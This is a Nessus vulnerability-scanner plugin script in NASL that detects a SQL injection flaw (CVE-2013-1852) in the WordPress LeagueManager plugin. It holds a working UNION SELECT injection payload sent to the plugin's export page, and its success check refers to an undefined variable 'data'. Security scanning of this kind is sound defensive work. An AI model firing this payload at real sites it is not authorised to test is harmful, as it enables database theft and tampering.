#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69852);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2013-1852");
  script_bugtraq_id(58503);
  script_osvdb_id(91442);
  script_xref(name:"EDB-ID", value:"24789");

  script_name(english:"LeagueManager Plugin for WordPress 'wp-admin/admin.php' 'league_id' Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'league_id' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress LeagueManager plugin installed on the remote host is
affected by a SQL injection vulnerability due to a failure to properly
sanitize user-supplied input to the 'league_id' parameter of the
'/wp-admin/admin.php' script. A remote, unauthenticated attacker can
leverage this issue to launch a SQL injection attack against the
affected application, leading to manipulation of data in the back-end
database or disclosure of arbitrary data.

The application is also reportedly affected by several additional SQL
injection vulnerabilities although Nessus has not tested for these.");
  # http://packetstormsecurity.com/files/120817/WordPress-LeagueManager-3.8-SQL-Injection.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1ee9ce95");
  script_set_attribute(attribute:"see_also", value:"http://plugins.trac.wordpress.org/changeset/682945/leaguemanager");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/leaguemanager/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.8.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/09/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:kolja_schleich:leaguemanager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "LeagueManager";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "leaguemanager/admin/js/functions.js"][0] =
    make_list('var Leaguemanager');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

time = unixtime();
token = rand() % 10000;

payload = "leaguemanager_export=Download+File&league_id=7+UNION+SELECT+ALL+" +
time + ",2,3,4,5,6,7,8,9,10,11,12,13,"+token+",15,16,17,18,19,20,21,22,23," +
"24+--+&mode=teams";

payload = urlencode(
  str        : payload,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789=+&_"
);

res2 = http_send_recv3(
  method       : "POST",
  item         : dir + "/wp-admin/admin.php?page=leaguemanager-export",
  data         : payload,
  content_type : "application/x-www-form-urlencoded",
  port         : port,
  exit_on_fail : TRUE
);
attack = http_last_sent_request();

if (
  'Coach' >< res2[2] &&
  'Home Team' >< res2[2] &&
  data >< res2[2] &&
  token >< res2[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following '+
      'request :' +
      '\n' +
      '\n' + attack +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
       '\nThis produced the following output :' +
       '\n' +
       '\n' + chomp(res2[2]) +
       '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
